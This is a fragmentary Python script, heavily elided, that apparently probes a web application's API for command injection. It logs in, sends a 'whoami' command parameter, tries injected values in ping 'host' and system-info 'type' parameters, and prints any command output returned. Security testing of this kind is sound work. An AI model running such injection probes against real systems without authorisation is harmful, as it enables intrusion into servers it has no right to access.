...
def login():
    ...
    try:
        ...
        r = requests.post(f"{BASE_URL}/api/auth/login", json=login_data, timeout=TIMEOUT)
...
def test_simple_command_injection(token):
    ...
    # Test basic command
    command = "whoami"
    r = requests.get(endpoint, params={"command": command}, headers=headers, timeout=TIMEOUT)
...
def test_ping_command_injection(token):
    ...
    # Test basic ping
    r = requests.get(endpoint, params={"host": "127.0.0.1"}, headers=headers, timeout=TIMEOUT)
    ...
    r = requests.get(endpoint, params={"host": command}, headers=headers, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")
...
def test_system_info_injection(token):
    ...
    r = requests.get(endpoint, params={"type": command}, headers=headers, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")
